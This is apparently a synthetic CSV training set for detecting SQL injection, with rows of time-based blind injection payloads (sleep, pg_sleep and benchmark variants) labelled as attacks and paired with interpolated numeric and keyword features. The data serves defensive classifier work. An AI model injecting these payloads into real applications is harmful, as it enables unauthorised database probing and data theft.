id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000647,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,2.0624798191137836,80.88586487226888,26.177172974453775,3.5681160239515455,22.812607569344532,15.083476759126043,33.35434594890755,9.635434594890755,0.2830748819545788,0.18317390437957332,0.4126690829278173,0.12108213073803063,0.0,0.3645654051092448,2.0,0.0,0.0,1.6354345948907552,0.0,4.635434594890755,0.0,1.0,0.0,3.6354345948907554,0.0,0.3645654051092448,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6354345948907552,1.0,0.6354345948907552,0.36456540510924484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6354345948907554
SMOTE_000648,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.28226201584856936,57.89059784960307,23.881253620052924,3.6284442850596452,17.821880430079386,10.474985519788305,22.474985519788305,7.118746379947076,0.3094094598493347,0.179865544866448,0.38778777337638054,0.1229372219078367,0.0,0.9406268100264619,2.0,0.0,0.0,1.059373189973538,0.0,3.059373189973538,0.0,0.0,0.05937318997353802,3.059373189973538,0.0,0.940626810026462,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000649,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.622255553589718,58.97735313679406,19.778308579007426,3.215749608030874,16.710367989389603,7.800955442213371,26.22169142099257,8.244338284198514,0.28213043557638656,0.13422744279211204,0.44394445884252437,0.13969766278897702,0.0,0.7330148525955431,1.5113234316029711,0.0,0.0,1.0,0.0,4.244338284198514,0.0,0.0,0.7556617158014856,2.511323431602971,0.0,0.2443382841985145,0.7556617158014856,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.24433828419851433,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2443382841985144
SMOTE_000650,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,2.1162436729499383,88.29863982421777,21.516591101345433,2.9246561709108043,28.0,2.0,46.232275418836046,12.066364405381728,0.3204538803238813,0.022889562880277242,0.5209060165657777,0.13575054023006378,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.549773304036297,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.5165911013454318,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000651,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.121013491762364,66.51770429654111,21.448300226133743,3.315730901033727,15.0,13.58640180906994,29.034702035203683,8.896600452267485,0.23001218888309077,0.19991810612643202,0.43575237586840254,0.1343173291220746,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.4483002261337425,0.0,4.4483002261337425,0.0,0.0,1.0,3.4483002261337425,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44830022613374243,0.0,0.5516997738662576,0.4483002261337423,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4483002261337425
SMOTE_000652,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.479657937369366,70.28449882697694,24.0,3.456967649648474,19.0,10.0,30.427599061581557,10.856899765395388,0.27050672690726374,0.14237196153013884,0.4326803392522418,0.15444097231035556,0.1431002346046112,0.8568997653953889,2.0,0.0,0.0,1.0,0.0,4.856899765395389,1.0,1.0,0.0,3.0,0.14310023460461102,0.8568997653953889,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000653,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.9951642276671437,75.67823950129252,25.138616411916768,3.3763959884631265,19.569308205958382,10.0,34.97031488341737,11.138616411916768,0.2611697318489769,0.13384768254601584,0.45741663303589786,0.14756595256910943,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.707924617875151,0.4306917940416164,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5693082059583836,0.4306917940416163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000654,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,0.46213724852710264,93.51552992518664,24.914078345802224,3.3950304188968077,39.140783458022256,1.0859216541977759,41.11698150457107,12.17184330839555,0.41918884159754577,0.01156459041112265,0.4391504380273318,0.1300961299639998,2.82815669160445,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.257764962593324,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.08592165419777462,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9140783458022254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.914078345802226
SMOTE_000655,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,1.2368325116013963,57.9336675030858,17.62653299876568,2.884781691202746,17.120401003702966,1.0,29.18673350061716,10.62653299876568,0.29454560757263615,0.017279663977621443,0.5041220860061375,0.18405264244360492,2.439799498148517,0.5602005018514826,0.0,0.0,0.0,1.0,0.0,5.0,0.8132664993828391,0.8132664993828391,0.0,1.0000000000000002,0.8132664993828391,0.18673350061716085,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.18673350061716087,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.186733500617161
SMOTE_000656,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.9551463571323239,70.54089911559093,24.45910088440906,3.492259014890214,19.918201768818122,10.0,30.31134867338641,10.311348673386409,0.2826934562951334,0.14178220225435612,0.4295443729796113,0.14597996847089909,0.0,0.7704495577954692,2.0,0.0,0.0,1.0,0.0,4.7704495577954695,0.7704495577954693,1.0,0.0,3.0,0.0,0.7704495577954692,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000657,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,2.2827150164296293,76.36646270540218,24.894410450900363,3.351995312887064,19.447205225450183,10.0,35.47205225450182,11.447205225450181,0.2556912912954898,0.13173856659527886,0.4622697040899646,0.15030043801926674,0.44720522545018165,0.5527947745498183,2.0,0.0,0.0,1.0,0.0,5.894410450900363,0.5527947745498184,1.0,0.0,3.0,0.44720522545018165,0.5527947745498184,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4472052254501816,0.5527947745498184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000658,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.18285129395736854,78.8446859464849,20.8964572976566,3.043741277064065,27.948228648828298,2.0,38.9482286488283,9.9482286488283,0.35447349379677856,0.02536819255613429,0.4939985528555171,0.12615976079157007,0.0,0.9482286488282994,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.9482286488282993,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9482286488282994,0.051771351171700564,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000659,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.4161495075767928,75.05467953384368,22.0,3.3390300420379715,15.0,18.0,32.443743627074944,9.610935906768736,0.20006850775475193,0.24008220930570234,0.4318739457312564,0.1279753372082893,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.610935906768737,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000660,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.4204573178131097,85.80089807138236,27.0,3.753148819918086,32.80987878520608,11.592815428941034,31.39820385723526,10.0,0.38216390465517647,0.1352904440732018,0.365994212244785,0.1165514390268367,0.0,3.4026942141471124,0.3982038572352584,0.0,0.0,1.1991019286176292,0.0,4.0,0.0,1.0,0.0,1.5973057858528876,0.0,1.0,0.1991019286176292,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.19910192861762924,1.0,1.6017961427647416,0.1991019286176292,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000661,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,1.2422849949352615,91.03065428105111,27.13709875675024,3.7811073298753817,19.482259254050145,28.101617264850535,32.96451850810029,10.482259254050145,0.21494174612773997,0.306832457855156,0.3632437153090336,0.1149820807080704,0.8274197513500484,-1.1102230246251565e-16,1.6548395027000966,0.0,0.0,1.8274197513500483,0.0,5.0,0.0,0.0,1.0,3.4822592540501454,0.8274197513500483,0.0,0.8274197513500483,0.17258024864995156,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8274197513500485,0.0,0.8274197513500485,0.17258024864995158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8274197513500483
SMOTE_000662,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.44023137217826575,74.05789285473186,22.0,3.3617273955533165,15.0,18.0,31.646314283785493,9.411578570946373,0.20276544141035752,0.243318529692429,0.4269115878049422,0.1270044410922713,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.411578570946373,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000663,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.2414710226193145,97.58707130919068,27.96558927576589,3.6405731344275267,30.17205362117055,17.724714206127118,38.72471420612712,10.96558927576589,0.30959291831976665,0.1813543792874971,0.39666898565994557,0.11238371673279066,0.0,1.1032321727023298,1.93117855153178,0.0,0.0,1.9655892757658902,0.0,4.96558927576589,0.0,1.0,0.0,3.89676782729767,0.0,1.0,0.96558927576589,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9655892757658902,1.0,0.06882144846822003,0.9655892757658899,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000664,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,2.0851522851684225,93.87722851921582,26.283888316434926,3.377085597232236,27.838883164349255,10.0,43.173898620606266,12.864446734260298,0.30010080963335917,0.10683621611218434,0.45669637943855773,0.13636659481589875,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.864446734260298,0.0,0.2838883164349257,0.7161116835650744,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2838883164349256,0.0,0.0,0.2838883164349256,1.2838883164349255,0.7161116835650743,0.0,0.0,0.0,0.0,0.0,0.0,0.7161116835650744,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2838883164349255
SMOTE_000665,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.4432067943567315,67.8454317857742,25.230287857182798,3.622163445940463,21.4605757143656,10.0,27.6151439285914,8.7697121428172,0.3158398755420333,0.14746281996975363,0.4070647433182102,0.1296325611700029,0.38485607140860023,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.3848560714086002,1.0,0.0,3.0,0.3848560714086001,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000666,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.5015944075510127,93.11347815239502,27.835954621947394,3.821689529425871,19.58988655486848,29.26179579876327,33.50786386584218,10.75393193292109,0.21034644147143353,0.313810856185769,0.3604369605370726,0.1154057418057249,1.0,-1.1102230246251565e-16,1.8359546219473932,0.0,0.0,1.9179773109736966,0.0,5.0,0.0,0.0,1.0,3.7539319329210894,1.0,0.0,0.9179773109736966,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9179773109736968,0.0,0.9179773109736966,0.08202268902630333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9179773109736966
SMOTE_000667,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.4962175997192253,87.88839588027712,27.577679176055423,3.6483675545204797,24.577679176055423,18.0,35.3107167042217,10.0,0.27970996455399477,0.2049684802817009,0.401450177230026,0.11387137793427828,0.0,0.4223208239445761,2.0,0.0,0.0,2.0,0.0,4.577679176055424,0.0,1.0,0.0,4.0,0.0,0.4223208239445761,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.577679176055424,0.422320823944576,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000668,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,1.2763566446491152,73.5008257554954,16.500825755495402,2.481563411798002,12.22794834540533,3.091509640360295,43.59068388486489,14.590683884864891,0.1648097720145138,0.04042621194694618,0.5951293350850861,0.199634680953454,3.590683884864889,-1.1102230246251565e-16,0.2728774100900735,0.0,0.0,1.0,0.0,7.863561294954963,1.7271225899099265,0.13643870504503677,0.0,1.2728774100900737,1.0,0.0,0.13643870504503675,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.13643870504503675,0.0,0.0,0.13643870504503675,1.8635612949549634,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8635612949549633,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000669,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.5015435663619041,74.47237359433863,26.342023349646166,3.6767792954208693,23.342023349646166,12.736186797169314,29.71011674823082,8.68404669929233,0.3158968488415681,0.16778740887660637,0.3997905532798713,0.11652518900195424,0.0,0.34202334964616427,2.0,0.0,0.0,1.3420233496461642,0.0,4.0,0.0,1.0,0.0,3.342023349646164,0.0,0.34202334964616427,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3420233496461643,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.342023349646164
SMOTE_000670,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.8269609051277939,58.41929067466684,23.822588665666647,3.6159040383566525,18.177411334333353,10.0,22.887056671666777,7.35482266866671,0.3116235395176783,0.171607852430049,0.3911843010640582,0.12558430698821446,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.1774113343333545,0.0,0.1774113343333546,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.17741133433335454,0.0,0.8225886656666455,0.17741133433335454,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8225886656666455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000671,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.6330090732260517,94.39725627484104,21.855403126380057,2.8432911590280416,28.0,2.0,50.97564376932081,13.421612505520232,0.2981700149164101,0.021297858208315007,0.5387684801066871,0.14176364676858774,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.566209379140174,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.8554031263800577,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000672,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.924920398254349,64.03955080090255,21.431396485778752,3.3654898476597004,15.0,13.451171886230025,27.156982428893766,8.431396485778754,0.2369269008588271,0.20588421010352392,0.4248362573882363,0.1323526316494127,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.431396485778753,0.0,4.0,0.0,0.0,1.0,3.4313964857787527,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4313964857787529,0.0,0.5686035142212471,0.43139648577875284,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.431396485778753
SMOTE_000673,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,1.5564744688587637,77.32207081349694,19.881380542331296,2.9949868488643023,27.44069027116565,2.0,38.44069027116565,9.440690271165648,0.3548961606669173,0.02587539280030081,0.49721082106857184,0.12201762546420998,0.0,0.44069027116564746,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.44069027116564746,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.4406902711656475,0.5593097288343524,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000674,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,1.5986605792901432,70.2400391501336,18.35429690003817,2.9406331449992815,22.70628907001145,3.118867210034354,34.237734420068705,10.177148450019086,0.33197689741233305,0.036602881255736006,0.48645466570340073,0.14496555562853025,0.0,3.235429690003817,0.0,0.0,0.0,1.0,0.0,5.706289070011451,0.0,0.0,0.23542969000381705,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7645703099961829,0.0,0.0,0.0,1.0,0.23542969000381708,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000675,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,2.4490204921877003,60.51786202298864,23.505954007662876,3.6998854328277417,21.505954007662876,10.505954007662877,21.74702299616856,6.758931011494315,0.3554044808264272,0.17331751400840245,0.36028197973095055,0.11099602543421978,1.2529770038314385,-1.1102230246251565e-16,0.505954007662877,0.0,0.0,1.0,0.0,2.7470229961685613,0.0,0.0,0.0,1.505954007662877,1.0,0.0,0.2529770038314385,0.7470229961685615,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7470229961685615,0.0,0.2529770038314384,0.2529770038314384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2529770038314387
SMOTE_000676,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.9030622707547047,65.9954259842599,22.800609868765346,3.5021520443305088,16.20091480314802,14.797560524938614,26.797560524938614,8.199390131234654,0.25134855654550653,0.22015270226094102,0.40437660289176003,0.12412213830179238,0.0,0.4003049343826732,2.0,0.0,0.0,1.5996950656173268,0.0,3.5996950656173268,0.0,0.0,0.5996950656173268,3.5996950656173268,0.0,0.40030493438267317,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
